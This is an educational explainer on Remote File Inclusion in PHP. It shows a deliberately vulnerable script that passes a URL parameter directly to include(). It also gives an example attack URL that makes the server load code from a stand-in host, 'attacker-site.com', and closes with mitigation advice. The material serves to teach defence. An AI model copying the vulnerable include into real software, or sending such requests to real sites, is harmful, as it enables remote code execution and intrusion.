# 🟨 RFI - Remote File Inclusion

Remote File Inclusion (RFI) is a vulnerability that occurs when a web application includes a remote file (usually from a remote server controlled by an attacker) in its output without proper sanitization or validation. Attackers can exploit RFI vulnerabilities to execute arbitrary code on the server, steal sensitive information, or achieve remote code execution.

Here's an explanation of RFI with an example:

Suppose you have a vulnerable PHP web application that includes a remote file based on a user-supplied parameter:

```php
<?php
// vulnerable.php

$file = $_GET['file']; // User-supplied input

include($file); // Include the specified file
?>
```

In this example, the PHP script includes a file specified by the `file` parameter from the URL query string. However, it does not properly validate or sanitize the input, making it vulnerable to RFI.

An attacker can exploit this vulnerability by supplying a URL pointing to a malicious PHP script in the `file` parameter. The malicious script will be executed on the server when included by the vulnerable PHP script.

For example, if the attacker submits the following URL:

```
http://vulnerable-site.com/vulnerable.php?file=http://attacker-site.com/malicious.php
```

The vulnerable PHP script will attempt to include the remote `malicious.php` script from the attacker's server. If the server allows remote file inclusion and has PHP code execution enabled, the `malicious.php` script will be executed, allowing the attacker to run arbitrary commands or code on the server.

The contents of the `malicious.php` script could be something like this:

```php
<?php
// malicious.php

echo "RFI vulnerability exploited!";
?>
```

When the vulnerable PHP script includes the `malicious.php` script, the server will execute it, and the output (`RFI vulnerability exploited!`) will be returned to the attacker.

To mitigate RFI vulnerabilities, web developers should:

* Avoid including files based on user-supplied input, especially from remote sources.
* If including remote files is necessary, validate and sanitize the input to ensure it refers only to allowed URLs or sources.
* Use whitelisting to specify trusted sources for including remote files.
* Implement proper input validation and output encoding to prevent other types of injection attacks.
